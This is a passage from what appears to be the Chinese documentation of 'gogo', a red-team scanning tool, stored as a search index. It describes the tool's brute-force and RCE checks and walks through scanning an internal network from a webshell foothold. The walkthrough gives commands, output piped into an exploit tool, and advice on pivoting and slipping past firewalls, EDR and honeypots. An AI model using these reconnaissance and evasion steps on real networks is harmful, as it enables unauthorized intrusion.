<li>\u6ca1\u6709\u505a\u4e0d\u540c\u7248\u672c\u7684\u7cbe\u7ec6\u9002\u914d\u3002\u5f88\u591a\u6f0f\u6d1e\u4e0d\u540c\u7684\u7248\u672c\u9700\u8981\u7684poc\u4e0d\u540c, nuclei\u76ee\u524d\u6ca1\u6709\u63d0\u4f9b\u5bf9\u5e94\u7684\u529f\u80fd\u3002</li> </ul> <p>\u5982\u679c\u662fpoc, nuclei\u968f\u65f6\u80fd\u89e3\u51b3\u5927\u90e8\u5206\u95ee\u9898, \u4f46\u5bf9\u4e8eexp\u6765\u8bf4, nuclei\u7684\u8bbe\u8ba1\u5b8c\u5168\u4e0d\u80fd\u89e3\u51b3\u3002\u5bf9\u4e8e\u7ea2\u961f\u573a\u666f, \u4e0d\u5c11\u4eba\u90fd\u624b\u63e1\u5404\u79cdoa, cms\u76840day, \u53ea\u9700\u8981\u505a\u6307\u7eb9\u8bc6\u522b\u4e0e\u7248\u672c\u8bc6\u522b, \u9700\u8981\u6253poc\u7684\u60c5\u51b5\u4e0d\u592a\u591a, \u6253exp\u66f4\u4e0d\u5e94\u8be5\u662fgogo\u5e94\u8be5\u505a\u7684\u4e8b\u60c5\u3002</p> <p>\u5bf9\u4e8e\u6f0f\u6d1e\u63a2\u6d4b\u6765\u8bf4, gogo\u9700\u8981\u6dfb\u52a0\u7684poc\u6709\uff1a</p> <ul> <li>\u5e38\u89c1\u8bbe\u5907\u4e0e\u670d\u52a1\u7684\u9ed8\u8ba4\u53e3\u4ee4\u767b\u5f55\uff08\u4e0e\u5176\u5728\u6587\u6863\u4e2d\u6536\u96c6\u8bbe\u5907\u7684\u9ed8\u8ba4\u5bc6\u7801, \u4e0d\u5982\u76f4\u63a5\u8f6c\u6362\u6210poc, \u81ea\u52a8\u5316\u7684\u5e2e\u4f60\u7206\u7834\uff09</li> <li>\u5e38\u89c1\u901a\u7528\u7ec4\u4ef6\u4e0e\u5e94\u7528\u7684RCE</li> <li>\u80fd\u7ed9\u7ea2\u961f\u5e26\u6765\u5e2e\u52a9\u7684\u4fe1\u606f\u6cc4\u9732\uff08\u901a\u5e38\u4f5c\u4e3a\u540e\u7eed\u653b\u51fb\u7684\u524d\u7f6e\u6b65\u9aa4\uff09</li> </ul> <p>\u5728gogo\u6dfb\u52a0poc\u65f6, \u901a\u7528\u6f0f\u6d1e\u4e0e\u53e3\u4ee4\u7206\u7834\u59cb\u7ec8\u4f4d\u4e8e\u7b2c\u4e00\u4f18\u5148\u7ea7\u3002\u73b0\u5728\u7684gogo\u4e5f\u5df2\u7ecf\u6709\u4e86\u7ea650\u4e2apoc, \u5176\u4e2d\u5305\u62ec\u4e86\u8fd120\u4e2a\u9ed8\u8ba4\u53e3\u4ee4\u7206\u7834\u7684poc\u3002\u8fd9\u4e9bpoc\u5c31\u80fd\u8986\u76d6\u5230\u8d85\u8fc7\u4e00\u534a\u7684\u5185\u7f51\u5e38\u89c1\u670d\u52a1\u4e86\u3002</p> <p>\u56e0\u6b64, gogo\u7684\u6f0f\u6d1e\u5e93\u4e0d\u4f1a\u662f\u4e00\u4e2a\u5927\u800c\u5168\u7684\u6f0f\u6d1e\u5e93, \u5982\u679c\u6709\u5927\u800c\u5168\u7684\u9700\u6c42, \u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528nuclei\u3002</p> <p>gogo\u60f3\u901a\u8fc7\u96c6\u6210nuclei\u7684\u751f\u6001, \u8ba9\u7ef4\u62a4poc\u5e93\u7701\u529b\u4e00\u4e9b, \u73b0\u5728\u57fa\u672c\u5904\u4e8e\u6709\u4eba\u53cd\u9988\u5e38\u89c1\u4ec0\u4e48poc, \u5c31\u6dfb\u52a0\u5bf9\u5e94\u7684poc\u3002</p> <p>gogo\u76ee\u524d\u5b8c\u6210\u4e86nuclei2.5\u7248\u672c\u7684http\u4e0enetwork\u4e24\u5927\u6a21\u5757, \u8db3\u591f\u80fd\u591f\u5e94\u5bf999%\u7684\u573a\u666f\u3002\u540e\u7eedgogo\u5c06\u4f1a\u5b9a\u671f\u540c\u6b65nuclei templates\u7684\u65b0\u529f\u80fd, \u6301\u7eed\u6539\u8fdbgogo\u5173\u4e8e\u6f0f\u626b\u7684\u4f53\u9a8c\u3002</p>"},{"location":"gogo/design/#\u5916\u7f51\u4f7f\u7528\u65f6\u7684\u7f3a\u9677","title":"\u5916\u7f51\u4f7f\u7528\u65f6\u7684\u7f3a\u9677","text":"<p>gogo\u56e0\u4e3a\u5176\u751f\u6210\u5668\u4ee5<code>ip</code>\u4e0e<code>port</code>\u8fdb\u884c\u751f\u6210, \u53ef\u4ee5\u63a5\u53d7\u57df\u540d\u7c7b\u4f3c\u7684\u8f93\u5165, \u4f46\u662f\u5b9e\u9645\u4e0a\u8fd8\u662f\u4f1a\u89e3\u6790\u4e3aip\u3002\u56e0\u6b64\u5728\u5916\u7f51\u65f6, \u6709\u4e9b\u65f6\u5019\u4e0d\u80fd\u5f88\u597d\u7684\u5b8c\u6210\u4efb\u52a1\u3002\u4f8b\u5982\u8f93\u5165\u7684<code>http://baidu.com/test</code></p> <ul> <li>\u5c06\u4f1a\u83b7\u53d6\u5176host\uff1a<code>baidu.com</code>, \u4e22\u5f03\u6389\u7aef\u53e3\u3001\u76ee\u5f55\u5728\u5185\u7684\u5176\u4ed6\u6570\u636e\u3002\u5bfc\u81f4\u975e\u6839\u76ee\u5f55\u7684\u6570\u636egogo\u65e0\u6cd5\u6b63\u786e\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\u3002</li> <li>\u5c06\u4f1a\u628a<code>baidu.com</code>\u89e3\u6790\u5230ip, \u5bfc\u81f4\u9664\u4e86<code>hostscan</code>\u63d2\u4ef6\u4e4b\u5916, \u5176\u4ed6\u7684\u63d2\u4ef6\u626b\u63cf\u65f6\u4e0d\u4f1a\u5e26\u4e0ahost\u3002\u9762\u5bf9cdn\u7684\u573a\u666f\u975e\u5e38\u65e0\u529b\u3002</li> <li>\u5982\u679c\u901a\u8fc7<code>-l</code>\u8f93\u5165\u4e86\u591a\u4e2a\u5e26\u57df\u540d\u7684\u76ee\u6807, \u5982\u679c\u591a\u4e2a\u76ee\u6807\u89e3\u6790\u5230\u540c\u4e00\u4e2aip, \u5c06\u8fdehostscan\u4e5f\u65e0\u6cd5\u6b63\u786e\u7684\u5e26\u4e0a\u6bcf\u4e00\u4e2ahost\u3002</li> </ul> <p>\u66fe\u7ecf\u6709\u4e2a\u7248\u672c\u7684gogo\u5c06host\u5e94\u7528\u5230\u5168\u5c40\u7684\u626b\u63cf\u4e2d, \u4f46\u51fa\u73b0\u4e86\u66f4\u591a\u7684\u95ee\u9898, \u6700\u7ec8\u53bb\u6389\u4e86\u9664\u4e86<code>nucleiscan</code>\u4e0e<code>hostscan</code>\u63d2\u4ef6\u4ee5\u5916\u7684\u9002\u914d\u3002</p> <p>\u6ce8\u610f</p> <p>\u5728\u5916\u7f51\u4f7f\u7528gogo\u65f6, \u8bf7\u6ce8\u610f\u53ef\u80fd\u4ea7\u751f\u7684\u6f0f\u62a5\u3002</p>"},{"location":"gogo/design/#\u5c0f\u7ed3","title":"\u5c0f\u7ed3","text":"<p>\u672c\u6587\u4ecb\u7ecd\u4e86gogo\u5728\u4e00\u4e9b\u529f\u80fd\u4e0a\u7684\u53d6\u820d, \u8bbe\u8ba1\u4ee5\u53ca\u521b\u65b0\u3002\u4f46\u5b9e\u9645\u4e0a\u8fd8\u6709\u4e0d\u5c11\u7ec6\u8282\u6211\u6ca1\u6709\u4e00\u4e00\u4ecb\u7ecd, \u4f7f\u7528\u8005\u53ef\u4ee5\u5728\u5b9e\u6218\u4e2d\u6162\u6162\u4f53\u4f1a, \u4e5f\u6b22\u8fce\u63d0\u51fa\u65b0\u7684\u9700\u6c42\u4ee5\u53capr\u3002</p> <p>gogo\u6ca1\u6709\u9009\u62e9\u6210\u4e3a\u7f1d\u5408\u602a, \u6bcf\u4e2a\u7ec6\u8282\u90fd\u7ecf\u8fc7\u6f2b\u957f\u7684\u53cd\u590d\u7684\u6539\u52a8, \u6700\u7ec8\u5448\u73b0\u51fa\u6765\u73b0\u5728\u7684\u6837\u5b50\u3002\u53d7\u9650\u4e8e\u5f00\u53d1\u8005\u89c6\u91ce\u7684\u5c40\u9650, \u6216\u8bb8\u5728\u5f88\u591a\u5730\u65b9\u8fd8\u5b58\u5728\u7f3a\u9677, \u4f46\u6211\u76f8\u4fe1\u5728\u529f\u80fd\u4e0a\u5df2\u7ecf\u9760\u8fd1\u4e86\u7ea2\u961f\u573a\u666f\u7684\u6781\u9650\u3002</p> <p>\u5177\u4f53\u7684\u4f7f\u7528\u8bf7\u770b\u5165\u95e8\u4e0e<code>--help</code>\u3002</p> <p>gogo\u662f\u6574\u4e2a\u8ba1\u5212\u7248\u56fe\u4e2d\u53d1\u5e03\u7684\u7b2c\u4e00\u5757\u62fc\u56fe, \u4e5f\u662f\u76ee\u524d\u6700\u6210\u719f\u7684\u90e8\u5206\u3002\u795d\u5404\u4f4d\u7528\u7684\u5f00\u5fc3!</p> <p>\u5176\u4ed6\u5de5\u4ef6\u4f1a\u5728\u6574\u7406\u5b8c\u6210\u540e\u9010\u6b65\u5f00\u653e\u3002</p> <p>gogo\u7684\u4f7f\u7528\u8f83\u4e3a\u590d\u6742, \u6ce8\u91ca\u4e0e\u5355\u5143\u6d4b\u8bd5\u8fd9\u65b9\u9762\u5c06\u4f1a\u5728\u672a\u6765\u8865\u4e0a.\u5982\u679c\u6709\u4e0d\u6e05\u6670\u7684\u7528\u6cd5, \u53ef\u4ee5\u5728issue\u4e2d\u63d0\u51fa, \u770b\u5230\u540e\u4f1a\u53ca\u65f6\u56de\u590d.</p>"},{"location":"gogo/design/#\u672a\u6765\u5c55\u671b","title":"\u672a\u6765\u5c55\u671b","text":"<ol> <li>\u96c6\u6210\u5230\u81ea\u52a8\u5316\u5916\u7f51\u4fe1\u606f\u6536\u96c6\u5de5\u5177, \u4e0e\u56fe\u6570\u636e\u5e93\u76f8\u7ed3\u5408(\u5df2\u7ecf\u505a\u4e86\u4e00\u90e8\u5206)</li> <li>\u81ea\u52a8\u6536\u96c6\u7ed3\u679c, \u4ee5\u53ef\u89c6\u5316\u62a5\u544a\u7684\u5f62\u5f0f\u5448\u73b0(\u5df2\u7ecf\u505a\u4e86\u4e00\u90e8\u5206)</li> <li>\u4e0ewebshell, c2\u5de5\u5177\u8054\u52a8, \u5b9e\u73b0\u56fe\u5f62\u5316\u4e00\u952e\u4f7f\u7528(\u5df2\u7ecf\u505a\u4e86\u4e00\u90e8\u5206)</li> <li>\u4e0emaitai(\u6682\u672a\u516c\u5f00\u7684\u4ee3\u7406\u5de5\u5177)\u8054\u52a8, \u5b9e\u73b0gogo\u6d41\u91cf\u7684\u9ad8\u6027\u80fd\u8f6c\u53d1</li> <li>\u5185\u7f51\u5206\u5e03\u5f0f\u90e8\u7f72, \u591a\u70b9\u540c\u65f6\u626b\u63cf</li> <li>agent\u5316, \u7279\u6b8a\u7f51\u7edc\u73af\u5883\u4e0b, \u53ef\u4ee5\u53ea\u4e0a\u4f20tinyagent(\u901a\u8fc7maitai\u5b9e\u73b0, todo)</li> </ol>"},{"location":"gogo/do/","title":"gogo \u00b7 \u5b9e\u6218","text":""},{"location":"gogo/do/#\u524d\u8a00","title":"\u524d\u8a00","text":"<p>\u5982\u679c\u6ca1\u6709\u4e30\u5bcc\u7684\u7ea2\u961f\u7ecf\u9a8c, \u53ef\u80fd\u770b\u5b8c\u5173\u4e8egogo\u7684\u529f\u80fd\u4e0e\u8bbe\u8ba1\u7684\u4ecb\u7ecd\u4e5f\u65e0\u6cd5\u5b8c\u5168\u7406\u89e3\u90a3\u4e00\u957f\u4e32\u7684\u89e3\u91ca. </p> <p>\u63a5\u4e0b\u6765\u5c06\u4f1a\u7ed3\u5408\u4e00\u4e9b\u7ea2\u961f\u5e38\u89c1\u7684\u573a\u666f\u53bb\u4ecb\u7ecdgogo\u5982\u4f55\u6210\u4e3a\u7ea2\u961f\u4eba\u5458\u7684\u884d\u751f\u7684\"\u624b\u4e0e\u5927\u8111\"</p>"},{"location":"gogo/do/#\u57fa\u672c\u573a\u666f","title":"\u57fa\u672c\u573a\u666f","text":""},{"location":"gogo/do/#\u573a\u666f1-\u4ecewebshell-\u5165\u53e3\u5f00\u59cb","title":"\u573a\u666f1 \u4ecewebshell \u5165\u53e3\u5f00\u59cb","text":"<p>\u8fd9\u5e94\u8be5\u662f\u7ea2\u961f\u4e0ehw\u4e2d\u6700\u5e38\u89c1\u7684\u573a\u666f. </p> <p>\u62ff\u5230\u4e00\u4e2awebshell\u4e4b\u540e, \u9664\u53bb\u88ab\u52a8\u4fe1\u606f\u6536\u96c6, \u63a5\u4e0b\u53bb\u5c31\u8981\u5728\u5185\u7f51\u5f00\u59cb\u6a2a\u5411\u4e86, hw\u4e2d\u5927\u90e8\u5206\u76ee\u6807\u5e76\u6ca1\u6709\u975e\u5e38\u5f3a\u7684\u9632\u62a4. \u8fd9\u79cd\u60c5\u51b5\u4e0b, \u5927\u89c4\u6a21\u626b\u63cf\u624d\u662f\u4e00\u4e2a\u53ef\u63a5\u53d7\u7684\u9009\u9879. </p> <p>\u5982\u679c\u662f\u4e00\u4e9b\u540c\u7c7b\u5de5\u5177, \u53ef\u80fd\u80fd\u505a\u7684\u53ea\u6709\u6307\u5b9a\u4e00\u4e2ab\u6bb5, \u7136\u540e\u7b49\u626b\u63cf\u7ed3\u675f\u6536\u83dc. </p> <p>\u800cgogo, \u5728\u8fd9\u91cc\u80fd\u53ef\u4ee5\u4f53\u9a8c\u5230\u9ad8\u5ea6\u53ef\u63a7\u5bf9\u626b\u63cf\u884c\u4e3a\u7684\u6539\u53d8. </p> <p>\u4ee5\u4e00\u4e2a\u5185\u7f51ip\u5730\u5740\u4e3a172.16.2.2\u7684webshell \u4e3a\u4f8b.</p>"},{"location":"gogo/do/#\u7b2c\u4e00\u6b65-\u5bf9\u5f53\u524dc\u6bb5\u8fdb\u884c\u63a2\u6d4b","title":"\u7b2c\u4e00\u6b65 \u5bf9\u5f53\u524dC\u6bb5\u8fdb\u884c\u63a2\u6d4b","text":"<p>\u4e00\u822c\u6765\u8bf4, \u5b58\u5728\u5bf9\u5916web\u670d\u52a1\u7684\u7f51\u6bb5\u5728\u5b50\u7f51\u89c4\u5212\u65f6\u90fd\u81f3\u5c11\u4f1a\u5212\u5206\u4e00\u4e2aC\u6bb5,  \u5982\u679c\u4e0d\u662f, \u53ef\u4ee5\u901a\u8fc7\u67e5\u770b\u5f53\u524d\u7f51\u7edc\u914d\u7f6e\u8fdb\u884c\u4fee\u6539. </p> <p>\u800c\u540c\u4e00\u4e2a\u7f51\u6bb5(vlan)\u4e4b\u5185\u7684\u6d41\u91cf\u662f\u5f88\u96be\u90e8\u7f72\u63a2\u9488\u6216\u8005\u5c06\u6d41\u91cf\u955c\u50cf\u5230\u5b89\u5168\u8bbe\u5907. \u7edd\u5927\u90e8\u5206\u60c5\u51b5\u90fd\u662f\u5728\u6d41\u91cf\u7684\u51fa\u5165\u53e3, \u4e5f\u5c31\u662f\u4ea4\u6362\u673a\u4e4b\u95f4\u90e8\u7f72\u9632\u706b\u5899, \u6216\u8005\u5728\u6838\u5fc3\u4ea4\u6362\u673a\u4e0a\u505a\u6d41\u91cf\u955c\u50cf. \u56e0\u6b64, \u5bf9\u81ea\u8eab\u6240\u5728\u7f51\u6bb5\u7684\u626b\u63cf\u662f\u4e00\u4e2a\u76f8\u5bf9\u5b89\u5168\u7684\u9009\u62e9 </p> <p>\u5f53\u7136, \u5982\u679c\u5b58\u5728edr, hids, rasp\u7b49\u5728\u7ec8\u7aef\u4e0a\u7684\u8bbe\u5907, \u6216\u8005\u5b58\u5728\u5927\u91cf\u7684\u5185\u7f51\u871c\u7f50. \u6211\u4eec\u7684\u626b\u63cf\u884c\u4e3a\u8fd8\u662f\u6709\u53ef\u80fd\u88ab\u76d1\u63a7\u5230. \u4e0d\u8fc7\u8003\u8651\u5230\u4f7f\u7528gogo\u7684\u5bf9\u8c61,\u5927\u591a\u6570\u4e0d\u5177\u5907\u8f83\u5f3a\u7684\u7f51\u7edc\u9632\u62a4\u80fd\u529b, \u8fd9\u79cd\u98ce\u9669\u8fd8\u662f\u53ef\u4ee5\u63a5\u53d7\u7684. </p> <p>\u5e76\u4e14\u8fd9\u79cdedr, hids,rasp\u5bf9\u9ad8\u5e76\u53d1\u6d41\u91cf\u5e76\u4e0d\u654f\u611f, \u800c\u871c\u7f50\u4e5f\u51e0\u4e4e\u6bcf\u65f6\u6bcf\u523b\u90fd\u53d1\u751f\u7740\u5404\u79cd\u8bef\u62a5. \u7406\u8bba\u4e0a\u4efb\u610f\u7684syn\u5305\u5c31\u80fd\u89e6\u53d1\u544a\u8b66,  \u5728\u5b9e\u9645\u4e0a\u5b9e\u8df5\u4e2d, \u8fd9\u79cd\u76f8\u5bf9\u4f4e\u5371\u7684\u544a\u8b66\u4f1a\u88ab\u9632\u5b88\u4eba\u5458\u5ffd\u7565.</p> <p>\u56e0\u6b64, \u8fd9\u65f6\u5019, \u626b\u63cf\u53ef\u4ee5\u7a0d\u5fae\u5927\u80c6\u4e00\u4e9b. </p> <p><code>gogo -i 172.16.2.1/24 --af</code></p> <p>--af\u4e3a\u81ea\u52a8\u751f\u6210\u6587\u4ef6\u540d, \u5e76\u5c06\u626b\u63cf\u7ed3\u679c\u5bfc\u51fa\u5230\u8be5\u6587\u4ef6\u4e2d. </p> <p>\u5f53\u7136\u4e5f\u53ef\u4ee5\u624b\u52a8\u6307\u5b9a\u6587\u4ef6\u540d <code>gogo -i 172.16.2.1/24 -f 1.dat</code></p> <p>\u8fd9\u4e48\u505a\u7684\u539f\u56e0\u662f, webshell\u5f88\u53ef\u80fd\u63a5\u53d7\u4e0d\u4e86\u5927\u91cflog\u8f93\u51fa, \u5bfc\u81f4\u5361\u6b7b. \u5e76\u4e14\u5bfc\u51fa\u5230\u6587\u4ef6\u662f\u4e00\u4e2a\u9f13\u52b1\u5c06\u6587\u4ef6\u4e0b\u8f7d\u56de\u6765\u79bb\u7ebf\u4fdd\u5b58, \u5e76\u7528\u4f5c\u540e\u7eed\u5206\u6790\u5904\u7406\u7684\u884c\u4e3a. </p> <p>\u8f93\u51fa\u7684\u6587\u4ef6\u662fdeflate\u538b\u7f29\u7684, \u9700\u8981\u4f7f\u7528<code>gogo -F 1.dat</code> \u8fdb\u884c\u683c\u5f0f\u5316, \u683c\u5f0f\u5316\u540e\u7684\u6570\u636e\u5c06\u6309\u7167ip\u8fdb\u884c\u5206\u7c7b\u5e76\u6392\u5e8f. \u8fd8\u53ef\u4ee5\u914d\u5408--filter\u5bf9\u626b\u63cf\u7ed3\u679c\u8fdb\u884c\u7b5b\u9009. \u5982<code>gogo -F 1.dat --filter port::22</code></p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b, \u5c06\u8f93\u51fa\u683c\u5f0f\u5316\u7684\u7eaf\u6587\u672c\u6570\u636e, \u5982\u679c\u9700\u8981\u5bfc\u5165\u5230\u5176\u4ed6\u5de5\u5177, \u6216\u8005\u7528\u4f5c\u8fdb\u4e00\u6b65\u5206\u6790.</p> <p>\u53ef\u4ee5\u901a\u8fc7-o \u6307\u5b9a\u8f93\u51fa\u683c\u5f0f. \u4f8b\u5982: </p> <p><code>gogo -F 1.dat --filter frame::weblogic -o url | weblogic_exp</code> </p> <p>\u6216\u8005\u5bfc\u51fajson\u6587\u4ef6\u8fd8\u53ef\u4ee5\u63d0\u4f9b\u7ed9gogo\u81ea\u8eab</p> <p><code>gogo -F 1.dat --filter frame::weblogic -o json -f weblogic.json</code></p> <p>\u5982\u679c\u5176\u4e2d\u5b58\u5728\u871c\u7f50, \u6709\u7ecf\u9a8c\u7684\u653b\u51fb\u8005\u57fa\u672c\u4e0a\u53ef\u4ee5\u6839\u636egogo\u6536\u96c6\u7684\u4fe1\u606f\u8fdb\u884c\u9664\u521d\u6b65\u7684\u5224\u65ad, \u53ef\u4ee5\u5c06\u626b\u63cf\u7ed3\u679c\u8fc7\u6ee4\u540e\u518d\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b\u4ee5\u53ca\u6f0f\u6d1e\u626b\u63cf.</p> <p>\u5f53\u7136\u4e5f\u63d0\u4f9b\u4e86\u61d2\u4eba\u7684\u89e3\u51b3\u65b9\u6848, \u4e5f\u662f\u6211\u81ea\u8eab\u6bd4\u8f83\u5e38\u7528\u7684\u65b9\u5f0f. </p> <p><code>gogo -i 172.16.2.1/24 --af -ev -p common</code></p> <p>\u4e0d\u7ba1\u5185\u7f51\u6709\u6ca1\u6709\u871c\u7f50, \u76f4\u63a5\u5bf9\u7740\u5f53\u524dc\u6bb5\u7684\u5e38\u89c1\u7aef\u53e3\u4e00\u6ce2\u5f00\u542f\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b, \u4e3b\u52a8\u6f0f\u626b\u7684\u66b4\u529b\u63a2\u6d4b.</p>"},{"location":"gogo/do/#\u7b2c\u4e8c\u6b65-\u5bf9b\u6bb5\u8fdb\u884c\u6d4b\u7ed8","title":"\u7b2c\u4e8c\u6b65: \u5bf9B\u6bb5\u8fdb\u884c\u6d4b\u7ed8","text":"<p>\u5982\u679c\u901a\u8fc7\u7b2c\u4e00\u6b65\u6210\u679c\u5728\u76f8\u90bb\u7684\u7f51\u7edc\u8d44\u4ea7\u4e2d\u6a2a\u5411\u5230\u4e00\u4e9b\u6210\u679c, \u5efa\u8bae\u540e\u7eed\u7684\u626b\u63cf\u4f7f\u7528\u8fd9\u4e9b\u6210\u679c\u4f5c\u4e3a\u8df3\u677f, \u9632\u6b62\u90e8\u7f72\u9632\u706b\u5899, \u6d41\u91cf\u63a2\u9488\u76f4\u63a5\u6293\u5230\u6211\u4eec\u7684\u5165\u53e3\u5730\u5740.</p> <p>\u4e0d\u8fc7\u5c31\u7b97\u6ca1\u6709\u6a2a\u5411\u5230\u5176\u4ed6\u673a\u5668, \u4e5f\u6ca1\u6709\u5173\u7cfb. \u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\u7684\u5b9e\u8df5, \u53d1\u73b0\u5c31\u7b97\u90e8\u7f72\u4e86\u8f83\u5f3a\u9632\u62a4\u7684\u5185\u7f51, \u5bf9\u4e8e\u9ad8\u5e76\u53d1\u7684\u5904\u7406\u5927\u591a\u6570\u4e5f\u4e0d\u662f\u5c01\u7981, \u800c\u4e14\u544a\u8b66. \u53ef\u80fd\u662f\u56e0\u4e3a\u6b63\u5e38\u7684\u4e1a\u52a1\u4e2d\u4e5f\u4f1a\u5b58\u5728\u4e00\u4e9b\u9ad8\u5e76\u53d1\u884c\u4e3a.  \u5e76\u4e14, \u76f4\u5230\u73b0\u5728, \u4e5f\u6ca1\u9047\u5230\u871c\u7f50\u90e8\u7f72\u5728\u7f51\u5173\u4e0a(\u53ef\u80fd\u4eca\u5929\u8bf4\u5b8c\u4e4b\u540e\u5c31\u6709\u4e86lol).  \u56e0\u6b64, \u5bf9\u5185\u7f51\u7684\u7f51\u6bb5\u8fdb\u884c\u53d1\u73b0\u662f\u4e00\u4e2a\u76f8\u5bf9\u5b89\u5168\u7684\u884c\u4e3a. \u9632\u5b88\u65b9\u53ef\u80fd\u65e9\u5c31\u88ab\u5185\u7f51\u4e2d\u7684\u5404\u79cd\u8bef\u62a5\u5f04\u5f97\u75b2\u5026, \u5e76\u4e0d\u4f1a\u56e0\u4e3a\u4e00\u4e9b\u9ad8\u5e76\u53d1, \u4f46\u662f\u6ca1\u6709\u4efb\u4f55\u653b\u51fb\u6027\u7684\u884c\u4e3a\u8fdb\u884c\u5e94\u6025.</p> <p>\u4e00\u822c\u6765\u8bf4, \u5728\u6ca1\u6709\u5176\u4ed6\u60c5\u62a5\u7684\u60c5\u51b5\u4e0b, \u5bf9\u4e8e\u5f53\u524d\u6240\u5728\u7684\u7f51\u6bb5\u8fdb\u884c\u6d4b\u7ed8\u4f18\u5148\u7ea7\u6700\u9ad8.</p> <p>\u5982\u679c\u5f53\u524dwebshell\u7684ip\u4e3a<code>172.1.1.2</code>, \u90a3\u4e48\u53ef\u4ee5\u4f18\u5148\u5bf9172\u6bb5\u8fdb\u884c\u7f51\u6bb5\u53d1\u73b0.</p> <p><code>gogo -w 172b</code>  \u53d1\u73b0172.16.0.0/12\u4e2d\u5b58\u6d3b\u7684b\u6bb5.</p> <p>(\u6570\u636e\u5747\u4e3a\u968f\u673a\u751f\u6210)</p> <pre><code>[*] workflow 172B starting , 2022-11-16 18:48.11\n[*] Current goroutines: 4000, Version Level: 0,Exploit: , PortSpray Scan: false , 2022-11-16 18:48.11\n[*] Starting task 172.16.126.116/12 ,total ports: 3 , mod: ss , 2022-11-16 18:48.11\n[*] ports: 80,443,8080 , 2022-11-16 18:48.11\n[*] Spraying 172.16.126.116/12 with ss, Estimated to take 2 seconds , 2022-11-16 18:48.11\n[*] Smart port probes: icmp , Smart IP probes: [1 254] , 2022-11-16 18:48.11\n[*] Found 172.22.28.1/16 , 2022-11-16 18:48.11\n[*] Found 172.28.28.254/16 , 2022-11-16 18:48.11\n[*] Found 172.25.29.1/16 , 2022-11-16 18:48.11\n[*] Found 172.21.30.1/16 , 2022-11-16 18:48.11\n[*] Found 172.16.31.254/16 , 2022-11-16 18:48.11\n[*] Found 172.30.32.1/16 , 2022-11-16 18:48.11\n[*] Found 172.31.32.254/16 , 2022-11-16 18:48.11\n[*] Found 172.26.35.254/16 , 2022-11-16 18:48.11\n[*] Found 172.27.36.254/16 , 2022-11-16 18:48.11\n[*] Found 172.18.37.254/16 , 2022-11-16 18:48.11\n[*] Found 172.17.38.1/16 , 2022-11-16 18:48.11\n[*] Found 172.19.43.1/16 , 2022-11-16 18:48.12\n[*] Found 172.20.49.1/16 , 2022-11-16 18:48.12\n[*] Found 172.23.28.1/16 , 2022-11-16 18:48.12\n[*] Found 172.29.6.1/16 , 2022-11-16 18:48.12\n[*] Found 172.24.27.254/16 , 2022-11-16 18:48.12\n[*] Alived: 16, Totoal : 8160 , 2022-11-16 18:48.14\n[*] Time consuming: 2.100150675s , 2022-11-16 18:48.14\n[*] B CIDRs result: /root/bins/.172.16.126.116_12_top1_ss_bcidr.dat1 , 2022-11-16 18:48.14\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u53d1\u73b0\u4e86\u4e0d\u5c11\u5b58\u6d3b\u7684B\u6bb5, \u5e76\u4e14\u6570\u636e\u4f1a\u81ea\u52a8\u4fdd\u5b58\u5230\u5bf9\u5e94\u7684\u6587\u4ef6\u4e2d.</p> <p>\u8fd9\u4e2a\u6587\u4ef6\u662fdeflate\u538b\u7f29\u7684. \u76f4\u63a5\u6253\u5f00\u662f\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6, \u9700\u8981\u901a\u8fc7<code>gogo -F result.dat</code> \u8fdb\u884c\u683c\u5f0f\u5316.</p> <p>\u5f53\u7136, \u5982\u679c\u53ea\u662f\u7ed9gogo\u81ea\u8eab\u4f7f\u7528\u4e0d\u9700\u8981\u8fd9\u4e00\u6b65, \u76f4\u63a5\u901a\u8fc7-j \u5c06\u7ed3\u679c\u518d\u6b21\u8f93\u5165\u5373\u53ef\u4f7f\u7528\u4e0a\u6b21\u7684\u626b\u63cf\u7ed3\u679c. </p> <p>\u4f8b\u5982, \u5bf9\u5b58\u6d3b\u7684B\u6bb5\u542f\u7528smart\u8fdb\u884c\u626b\u63cf.</p> <p><code>gogo -j .172.16.126.116_12_top1_ss_bcidr.dat1 -w s</code> </p> <p>\u9ed8\u8ba4\u7684\u7f51\u5173ip\u4e3a1,254, \u53ef\u4ee5\u901a\u8fc7<code>--ipp 1-2,253,254</code>\u8fdb\u884c\u81ea\u884c\u4fee\u6539. </p> <p>\u9ed8\u8ba4\u7684\u63a2\u6d4b\u65b9\u6cd5\u4e3aICMP\u534f\u8bae, \u800c\u5728\u90e8\u5206\u7f51\u7edc\u73af\u5883\u4f1a\u6709\u7981ping\u7684\u89c4\u5219, \u53ef\u80fd\u9700\u8981\u4fee\u6539\u4e3a\u5176\u4ed6\u534f\u8bae, \u53ef\u4fee\u6539\u4e3a<code>--sp 80,443,23,161</code>\u8fd9\u79cd\u7f51\u5173\u5e38\u89c1\u7684\u5f00\u653e\u7aef\u53e3\u8fdb\u884c\u63a2\u6d4b.  \u53ea\u9700\u8981\u4efb\u610fB\u6bb5\u4e2d\u53d1\u73b0\u81f3\u5c11\u4e00\u4e2a\u7aef\u53e3\u54cd\u5e94, \u5373\u53ef\u5224\u5b9a\u5f53\u524dB\u6bb5\u88ab\u4f7f\u7528, \u5e76\u4e14\u4e0d\u8fdb\u884c\u540e\u7eed\u626b\u63cf.</p> <p>\u8fd9\u79cd\u63a2\u6d4b\u65b9\u5f0f\u5927\u4f53\u4e0a\u662f\u5b89\u5168\u7684, \u5728\u4e0d\u540c\u7684\u9879\u76ee\u4e2d\u6211\u4eec\u66fe\u4e0e\u9632\u5b88\u65b9\u6838\u5bf9\u653b\u51fb\u8def\u5f84\u65f6, \u9632\u5b88\u65b9\u90fd\u6ca1\u6709\u53d1\u73b0\u8fd9\u4e00\u9636\u6bb5\u7684\u626b\u63cf\u884c\u4e3a(\u5176\u4e2d\u90e8\u5206\u9632\u5b88\u65b9\u5df2\u7ecf\u662f\u4e1a\u5185\u7684\u5b89\u5168\u6807\u6746). </p> <p>\u800c\u5982\u679c\u5f53\u524d\u7684\u7f51\u6bb5\u4e3a192\u6bb5\u8fd9\u79cdB\u7c7b\u5730\u5740, \u90a3\u4e48<code>-m 